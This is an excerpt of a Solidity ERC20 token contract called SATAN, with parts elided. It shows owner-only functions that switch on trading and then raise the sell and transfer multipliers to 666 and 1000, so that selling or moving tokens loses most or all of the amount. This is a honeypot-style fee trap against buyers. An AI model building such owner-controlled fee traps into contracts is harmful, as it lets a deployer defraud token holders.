...
contract SATAN is Ownable, ERC20 {
    ...
    uint256 _totalSupply = 66_666_666_600 * (10 ** _decimals);
    ...
    function unleashSatan() public onlyOwner {
        TradingOpen = true;
        liquidityFee    = 0;
        marketingFee    = 0;
        utilityFee      = 10;
        teamFee         = 0; 
        burnFee         = 0;
        totalFee  = teamFee + marketingFee + liquidityFee + utilityFee + burnFee;
        feeDenominator  = 100;
    ...
    function hailSatan() public onlyOwner {
        buyMultiplier = 33;
        sellMultiplier = 666;
        transferMultiplier = 1000;
    }
    ...
    function setFinalTax() public onlyOwner {
        ...
        buyMultiplier = 100;
        transferMultiplier = 0;
        swapThreshold = _totalSupply * 20 / 10000; 
    }
